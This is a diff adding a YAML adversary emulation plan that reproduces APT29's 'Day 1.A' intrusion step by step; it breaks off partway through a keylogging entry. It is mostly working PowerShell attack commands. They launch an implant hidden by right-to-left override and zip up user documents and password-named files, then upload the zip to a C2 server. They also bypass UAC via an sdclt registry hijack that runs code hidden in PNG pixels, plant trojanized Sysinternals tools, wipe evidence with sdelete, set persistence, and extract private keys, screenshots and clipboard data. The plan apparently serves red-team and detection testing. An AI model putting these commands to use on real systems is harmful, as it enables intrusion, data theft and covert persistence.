@@ -1,0 +1,1140 @@
+# APT29-Day1.A.yaml - CALDERA and Atomic style TTPs
+
+- emulation_plan_details:
+    id: 8d3c142e-9d26-42e3-ad78-b3841373a789
+    adversary_name: APT29 Day 1.A
+    adversary_description: APT29 is a threat group that has been attributed to the Russian government who have been in operation since at least 2008. This group reportedly compromised the Democratic National Committee starting in the summer of 2015. This adversary models scenario Day 1.A of the APT29.
+    attack_version: 8.1
+    format_version: 1.0
+
+# Step 1 - Initial Breach
+
+- id: 571845f6-b75c-4b9d-a666-a78f7827261f
+  name: RTLO Start Sandcat
+  description: Perform RTLO technique with SANDCAT
+  tactic: execution
+  technique:
+    attack_id: T1036.002
+    name: "Masquerading: Right-to-Left Override"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163405/CosmicDuke.pdf"
+  procedure_group: procedure_execution
+  procedure_step: "1.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Sleep 3;
+          $bin = Get-ChildItem *cod*scr*;
+          $arguments = '-server "#{server}" -group "rtlo_group"';
+          start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;
+
+          if ($?) {
+            write-host "Successfully completed RTLO execution. A new agent should appear";
+            exit 0;
+
+          } else {
+            write-host "Failure of RTLO execution.";
+            exit 1;
+          }
+        payloads:
+        - cod.3aka3.scr
+
+  input_arguments:
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      Sleep 3;
+      $bin = Get-ChildItem *cod*scr*;
+      $arguments = '-server "#{server}" -group "rtlo_group"';
+      start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;
+
+      if ($?) {
+        write-host "Successfully completed RTLO execution. A new agent should appear";
+        exit 0;
+
+      } else {
+        write-host "Failure of RTLO execution.";
+        exit 1;
+      }
+
+- id: a5daa530-c640-49bc-aa54-6808789a684a
+  name: PowerShell
+  description: Spawn powershell.exe from cmd.exe
+  tactic: execution
+  technique:
+    attack_id: T1059.001
+    name: "Command and Scripting Interpreter: PowerShell"
+  cti_source: "https://securelist.com/the-cozyduke-apt/69731/"
+  procedure_group: procedure_execution
+  procedure_step: "1.B"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          powershell.exe;
+          if ($?) {
+            write-host "[*] PowerShell successfully spawned";
+            exit 0;
+          }
+
+  executors:
+  - name: command_prompt
+    command: |
+      powershell.exe;
+      if ($?) {
+        write-host "[*] PowerShell successfully spawned";
+        exit 0;
+      }
+
+# Step 2 - Rapid Collection and Exfiltration
+
+- id: 5692da31-3586-4e4f-8f07-5750070c730b
+  name: Automated Collection
+  description: Execute PowerShell from cmd.exe to collect and compress files of specific extensions.
+  tactic: collection
+  technique:
+    attack_id: T1119
+    name: "Automated Collection"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_collection
+  procedure_step: "2.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
+
+  executors:
+  - name: powershell
+    command: |
+      $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
+
+- id: 68e209dd-f354-4adc-8bc6-e85a3e55a7f4
+  name: Data from staged fileand Exfiltration over C2 Channel
+  description: Copy a target file from a remote file share through the existing C2 channel
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: "Exfiltration Over Command and Control Channel"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_exfiltration
+  procedure_step: "2.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\upload.ps1 -Verbose -Force;
+          Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/file/upload";
+        payloads:
+        - upload.ps1
+
+  input_arguments:
+    profile_user:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      Import-Module .\upload.ps1 -Verbose -Force;
+      Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/file/upload";
+
+# Step 3 - Deploy Stealth Toolkit
+
+- id: 68b588bc-002a-42dc-bac7-9189f944065b
+  name: Staging monkey PNG
+  description: Staging PNG for Lateral Movement
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1036.005
+    name: "Masquerading: Match Legitimate Name or Location"
+  cti_source: "https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016"
+  procedure_group: procedure_def_evasion
+  procedure_step: "3.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $username="#{profile_user}";
+          if ( $(test-path -path "C:\Users\$username\Downloads\monkey.png") -eq $false ) {
+            copy-item monkey.png -Destination "C:\Users\$username\Downloads\\" -Force;
+            if ($? -eq $True) {
+              write-host "[+] Successfully copied monkey.png!";
+              get-childitem -path "C:\Users\$username\Downloads\\";
+              exit 0;
+            } else {
+              write-host "[+] Failed to copy monkey.png.";
+              exit 1;
+            }
+
+            } else {
+              write-host "[*] monkey.png already exists within C:\users\$username\Downloads..."
+            }
+        payloads:
+        - monkey.png
+
+  input_arguments:
+    profile_user:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+  executors:
+  - name: powershell
+    command: |
+      $username="#{profile_user}";
+      if ( $(test-path -path "C:\Users\$username\Downloads\monkey.png") -eq $false ) {
+        copy-item monkey.png -Destination "C:\Users\$username\Downloads\\" -Force;
+        if ($? -eq $True) {
+          write-host "[+] Successfully copied monkey.png!";
+          get-childitem -path "C:\Users\$username\Downloads\\";
+          exit 0;
+        } else {
+          write-host "[+] Failed to copy monkey.png.";
+          exit 1;
+        }
+
+- id: 89e9dffa-8836-4672-8cf3-bebd006d2a2b
+  name: UAC Bypass via Backup Utility
+  description: Modify registry values of sdclt to bypass UAC
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
+  cti_source: "https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016"
+  procedure_group: procedure_privesc
+  procedure_step: "3.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (!(test-path -path $env:windir\system32\sdclt.exe)) {
+            write-host "[!] sdclt.exe was not found on this host.";
+            exit 1;
+          }
+          New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
+          New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
+          New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
+          New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
+
+          $username="#{profile_user}";
+          $payload='powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName "System.Drawing"; $g=a System.Drawing.Bitmap("C:\Users\$($username)\Downloads\monkey.png");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"';
+
+          Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value $payload -Force;
+          Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force;
+
+          cmd.exe /c sdclt.exe;
+          cmd.exe /c powershell.exe;
+
+  input_arguments:
+    profile_user:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+  executors:
+  - name: powershell
+    command: |
+      if (!(test-path -path $env:windir\system32\sdclt.exe)) {
+        write-host "[!] sdclt.exe was not found on this host.";
+        exit 1;
+      }
+      New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
+      New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
+      New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
+      New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
+
+      $username="#{profile_user}";
+      $payload='powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName "System.Drawing"; $g=a System.Drawing.Bitmap("C:\Users\$($username)\Downloads\monkey.png");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"';
+
+      Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value $payload -Force;
+      Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force;
+
+      cmd.exe /c sdclt.exe;
+      cmd.exe /c powershell.exe;
+
+- id: 5ff80022-8d85-410b-b868-6c7565b267e5
+  name: Registry Cleanup for UAC Bypass Technique
+  description: Delete registry entries post-UAC bypass.
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1112
+    name: "Modify Registry"
+  cti_source: "https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016"
+  procedure_group: procedure_def_evasion
+  procedure_step: "3.C"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
+          if (!(test-path -path HKCU:\Software\Classes\Folder)) {
+            write-host "[+] Reg keys removed!";
+           }
+
+  executors:
+  - name: powershell
+    command: |
+      Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
+      if (!(test-path -path HKCU:\Software\Classes\Folder)) {
+        write-host "[+] Reg keys removed!";
+        }
+
+# Step 4 - Defense Evasion and Discovery
+
+- id: 4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d
+  name: Planting Modified Sysinternals Utilities
+  description: Uploading payloads masquerading as via modified SysInternalsSuite
+  tactic: stage-capabilities
+  technique:
+    attack_id: T1036.005
+    name: "Masquerading: Match Legitimate Name or Location"
+  cti_source: "N/A"
+  procedure_group: procedure_staging
+  procedure_step: "4.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          iwr -uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -outfile SysInternalsSuite.zip;
+          Expand-Archive -Path SysInternalsSuite.zip -DestinationPath "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -Force;
+
+          if (! $?) {
+            write-host "Error moving files to #{profile_user}\Downloads";
+            exit 1;
+          }
+
+          Move-Item Modified-SysInternalsSuite.zip "C:\Users\#{profile_user}\Downloads" -Force;
+          Expand-Archive -LiteralPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -DestinationPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -Force;
+
+          if (! $?) {
+            write-host "Error expanding files to #{profile_user}\Downloads";
+            exit 1;
+          }
+
+          $dir_exists=Test-Path -path "C:\Program Files\SysInternalsSuite";
+          if ($dir_exists -eq $true) {
+            write-host "[*] SysInternalsSuite folder exists within \"C:\Program Files\", copying over payloads then removing folder from Downloads.";
+            Move-Item -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+            Move-Item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+          } else {
+            mkdir "C:\Program Files\SysInternalsSuite";
+            Copy-Item -Path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+            Copy-Item -Path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+          }
+
+          if (test-path -path "SysInternalsSuite.zip") {
+            Remove-Item -path "filesystem::SysInternalsSuite.zip" -force;
+          }
+
+          if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" ) {
+            remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -force;
+          }
+
+          if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite") {
+            remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -recurse -force;
+          }
+
+          if (test-path -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite") {
+            Remove-Item -path  "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -recurse -force;
+          }
+
+          Set-Location -path "C:\Program Files\SysInternalsSuite";
+          if ($?) {
+            gci;
+            write-host "[*] Successfully planted files"
+          } else {
+            write-host "[!] Error downloading and planting modified system tools."
+          }
+
+        payloads:
+        - Modified-SysInternalsSuite.zip
+
+  input_arguments:
+    profile_user:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+  executors:
+  - name: powershell
+    command: |
+      iwr -uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -outfile SysInternalsSuite.zip;
+      Expand-Archive -Path SysInternalsSuite.zip -DestinationPath "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -Force;
+
+      if (! $?) {
+        write-host "Error moving files to #{profile_user}\Downloads";
+        exit 1;
+      }
+
+      Move-Item Modified-SysInternalsSuite.zip "C:\Users\#{profile_user}\Downloads" -Force;
+      Expand-Archive -LiteralPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -DestinationPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -Force;
+
+      if (! $?) {
+        write-host "Error expanding files to #{profile_user}\Downloads";
+        exit 1;
+      }
+
+      $dir_exists=Test-Path -path "C:\Program Files\SysInternalsSuite";
+      if ($dir_exists -eq $true) {
+        write-host "[*] SysInternalsSuite folder exists within \"C:\Program Files\", copying over payloads then removing folder from Downloads.";
+        Move-Item -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+        Move-Item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+      } else {
+        mkdir "C:\Program Files\SysInternalsSuite";
+        Copy-Item -Path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+        Copy-Item -Path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+      }
+
+      if (test-path -path "SysInternalsSuite.zip") {
+        Remove-Item -path "filesystem::SysInternalsSuite.zip" -force;
+      }
+
+      if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" ) {
+        remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -force;
+      }
+
+      if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite") {
+        remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -recurse -force;
+      }
+
+      if (test-path -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite") {
+        Remove-Item -path  "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -recurse -force;
+      }
+
+      Set-Location -path "C:\Program Files\SysInternalsSuite";
+      if ($?) {
+        gci;
+        write-host "[*] Successfully planted files"
+      } else {
+        write-host "[!] Error downloading and planting modified system tools."
+      }
+
+- id: 646be6c9-f27a-4f5f-be5d-b8a0317e215f
+  name: Process Discovery
+  description: List running process on the machine via PowerShell.
+  tactic: discovery
+  technique:
+    attack_id: T1057
+    name: "Process Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "4.B.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $ps = get-process;
+          write-output $ps;
+
+  executors:
+  - name: powershell
+    command: |
+      $ps = get-process;
+      write-output $ps;
+
+- id: 9b5b5aec-32ff-4d74-8555-727b50ab15f6
+  name: Artifact Cleanup - Delete Files
+  description: Cleanup files related to Operation
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal on Host: File Deletion"
+  cti_source: "https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments"
+  procedure_group: procedure_def_evasion
+  procedure_step: "4.B.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (! $(test-path -path "C:\Program Files\SysInternalsSuite";)) {
+            write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+            exit 1;
+          }
+          Set-Location -path "C:\Program Files\SysInternalsSuite";
+          gci $env:userprofile\Desktop;
+          .\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\‮cod.3aka3.scr";
+          .\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip";
+          .\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysInternalsSuite.zip";
+
+  executors:
+  - name: powershell
+    command: |
+      if (! $(test-path -path "C:\Program Files\SysInternalsSuite";)) {
+        write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+        exit 1;
+      }
+      Set-Location -path "C:\Program Files\SysInternalsSuite";
+      gci $env:userprofile\Desktop;
+      .\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\‮cod.3aka3.scr";
+      .\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip";
+      .\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysInternalsSuite.zip";
+
+- id: 6f1f4768-7099-45d2-a858-b49dc792234e
+  name: Loading Stage-2 & Performing Discovery
+  description: Load Stage-2 from Modified Sysinternals Toolset
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: "System Information Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "4.C.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
+            write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+            exit 1;
+          }
+
+          Set-Location -path "C:\Program Files\SysInternalsSuite";
+          if (!(test-path ".\readme.ps1")) {
+            Move-Item .\readme.txt readme.ps1 -Force;
+          }
+          . .\readme.ps1;
+          Invoke-Discovery;
+
+  executors:
+  - name: powershell
+    command: |
+      if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
+        write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+        exit 1;
+      }
+
+      Set-Location -path "C:\Program Files\SysInternalsSuite";
+      if (!(test-path ".\readme.ps1")) {
+        Move-Item .\readme.txt readme.ps1 -Force;
+      }
+      . .\readme.ps1;
+      Invoke-Discovery;
+
+# Step 5 - Persistence
+
+- id: 9c75155e-21ab-4471-af16-45f3795a313c
+  name: Persistent Service 1
+  description: Leverage modified Sysinternals
+  tactic: persistence
+  technique:
+    attack_id: T1547.009
+    name: "Boot or Logon Autostart Execution: Shortcut Modification"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_persistence
+  procedure_step: "5.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Set-Location -path "C:\Program Files\SysinternalsSuite";
+          if (get-service -name "javamtsup" -ErrorAction SilentlyContinue) {
+            write-host "[*] Service already exists...Not running persistence step-1";
+            exit 1;
+          }
+
+          if (Test-Path -path "readme.ps1") {
+            . .\readme.ps1;
+            Invoke-Persistence -PersistStep 1;
+            write-host "[+] Persistence 1 invoked.";
+            exit 0;
+
+          } else {
+            write-host "[!] readme.ps1 not found.";
+            exit 1;
+          }
+
+  executors:
+  - name: powershell
+    command: |
+      Set-Location -path "C:\Program Files\SysinternalsSuite";
+      if (get-service -name "javamtsup" -ErrorAction SilentlyContinue) {
+        write-host "[*] Service already exists...Not running persistence step-1";
+        exit 1;
+      }
+
+      if (Test-Path -path "readme.ps1") {
+        . .\readme.ps1;
+        Invoke-Persistence -PersistStep 1;
+        write-host "[+] Persistence 1 invoked.";
+        exit 0;
+
+      } else {
+        write-host "[!] readme.ps1 not found.";
+        exit 1;
+      }
+
+- id: 45f18b58-c14f-4b61-a3da-41b67af21429
+  name: Persistent Service 2
+  description: Leverage modified Sysinternals
+  tactic: persistence
+  technique:
+    attack_id: T1547.009
+    name: "Boot or Logon Autostart Execution: Shortcut Modification"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_persistence
+  procedure_step: "5.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Set-Location -path "C:\Program Files\SysinternalsSuite";
+          if (Test-Path -path "readme.ps1") {
+            . .\readme.ps1;
+            Invoke-Persistence -PersistStep 2;
+            write-host "[+] Persistence 2 invoked.";
+
+          } else {
+            write-host "[!] readme.ps1 not found.";
+            return 1;
+          }
+
+  executors:
+  - name: powershell
+    command: |
+      Set-Location -path "C:\Program Files\SysinternalsSuite";
+      if (Test-Path -path "readme.ps1") {
+        . .\readme.ps1;
+        Invoke-Persistence -PersistStep 2;
+        write-host "[+] Persistence 2 invoked.";
+
+      } else {
+        write-host "[!] readme.ps1 not found.";
+        return 1;
+      }
+
+# Step 6 - Credential Access
+
+- id: e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d
+  name: Credentials In Files- Chrome
+  description: Obtain credentials from Chrome Dumper
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: "Credential Dumping"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_cred_access
+  procedure_step: "6.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+            write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+            exit 1;
+          }
+
+          Set-Location -path "C:\Program Files\SysinternalsSuite";
+          ./accesschk.exe -accepteula .;
+
+  executors:
+  - name: powershell
+    command: |
+      if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+        write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+        exit 1;
+      }
+
+      Set-Location -path "C:\Program Files\SysinternalsSuite";
+      ./accesschk.exe -accepteula .;
+
+- id: c4f4b13c-87b6-498c-b814-93570173068c
+  name: Credentials In Files (T1081) - Private Keys Extraction
+  description: Obtain credentials via Custom PowerShell
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: "Unsecured Credentials: Private Keys"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_cred_access
+  procedure_step: "6.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-PfxCertificate -Exportable -FilePath ".\dmevals.local.pfx" -CertStoreLocation Cert:\LocalMachine\My;
+
+          if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+            write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+            exit 1;
+          }
+          Set-Location -path "C:\Program Files\SysinternalsSuite";
+          . .\readme.ps1;
+          Get-PrivateKeys;
+          if ($? -eq $True) {
+              write-host "[+] Successfully executed private key collection script.";
+              exit 0;
+          } else {
+              write-host "[!] Error, could not execution Get-PrivateKeys.";
+              exit 1;
+          }
+        payloads:
+        - dmevals.local.pfx
+
+  executors:
+  - name: powershell
+    command: |
+      Import-PfxCertificate -Exportable -FilePath ".\dmevals.local.pfx" -CertStoreLocation Cert:\LocalMachine\My;
+
+      if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+        write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+        exit 1;
+      }
+      Set-Location -path "C:\Program Files\SysinternalsSuite";
+      . .\readme.ps1;
+      Get-PrivateKeys;
+      if ($? -eq $True) {
+          write-host "[+] Successfully executed private key collection script.";
+          exit 0;
+      } else {
+          write-host "[!] Error, could not execution Get-PrivateKeys.";
+          exit 1;
+      }
+
+# TODO
+# 6.C "Dump password hashes: [meterpreter*] > run post/windows/gather/credentials/credential_collector" missing!
+
+# Step 7 - Collection and Exfiltration
+
+- id: a4b14c10-49aa-4ae4-b165-d5a37364fe62
+  name: Staging files for PowerShell module imports
+  description: Renaming psversion.txt to psversion.txt to be imported
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1036.005
+    name: "Masquerading: Match Legitimate Name or Location"
+  cti_source: "https://securelist.com/the-cozyduke-apt/69731/"
+  procedure_group: procedure_def_evasion
+  procedure_step: "7.A.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
+            write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+            exit 1;
+          }
+
+          Set-Location -path "C:\Program Files\SysInternalsSuite";
+          if (test-path -path ".\psversion.txt" ) {
+            move-item .\psversion.txt psversion.ps1 -Force;
+          }
+            write-host "[+] File psversion.ps1 staged to be imported."
+
+  executors:
+  - name: powershell
+    command: |
+      if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
+        write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+        exit 1;
+      }
+
+      Set-Location -path "C:\Program Files\SysInternalsSuite";
+      if (test-path -path ".\psversion.txt" ) {
+        move-item .\psversion.txt psversion.ps1 -Force;
+      }
+        write-host "[+] File psversion.ps1 staged to be imported."
+
+- id: a81ea4ad-bc9f-49a7-82d4-4466df641487
+  name: Screen Capturing
+  description: Load custom PowerShell module and take screenshots.
+  tactic: collection
+  technique:
+    attack_id: T1113
+    name: "Screen Capture"
+  cti_source: "https://securelist.com/the-cozyduke-apt/69731/"
+  procedure_group: procedure_collection
+  procedure_step: "7.A.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (! $(test-path -path "C:\Program Files\SysinternalsSuite\psversion.ps1";)) {
+            write-host "[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped.";
+            exit 1;
+          }
+
+          Set-Location -path "C:\Program Files\SysinternalsSuite";
+          . .\psversion.ps1;
+          Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName "Screenshot";
+
+  executors:
+  - name: powershell
+    command: |
+      if (! $(test-path -path "C:\Program Files\SysinternalsSuite\psversion.ps1";)) {
+        write-host "[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped.";
+        exit 1;
+      }
+
+      Set-Location -path "C:\Program Files\SysinternalsSuite";
+      . .\psversion.ps1;
+      Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName "Screenshot";
+
+- id: ee4c2eab-be57-434c-a32c-14b77360301a
+  name: Automated Collection (T1119) - Clipboard (T1115)
+  description: Get contents of clipboard
+  tactic: collection
+  technique:
+    attack_id: T1115
+    name: "Clipboard Data"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_collection
+  procedure_step: "7.A.3"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $clip_data=get-clipboard;
+          if ($clip_data.Length -gt 0) {
+            write-host "[+] Clipboard data obtained!\n";
+            write-host $clip_data;
+          } else {
+            write-host "[!] No clipboard data available!\n";
+          }
+
+  executors:
+  - name: powershell
+    command: |
+      $clip_data=get-clipboard;
+      if ($clip_data.Length -gt 0) {
+        write-host "[+] Clipboard data obtained!\n";
+        write-host $clip_data;
+      } else {
+        write-host "[!] No clipboard data available!\n";
+      }
+
+- id: db28f68d-e8b8-46e6-b680-642570d4b257
+  name: Automated Collection (T1119) - Input Capture (T1417)
+  description: Load custom PowerShell module, and grab keystrokes for 15 seconds.
+  tactic: collection
+  technique:
+    attack_id: T1056.001
+    name: "Input Capture: Keylogging"
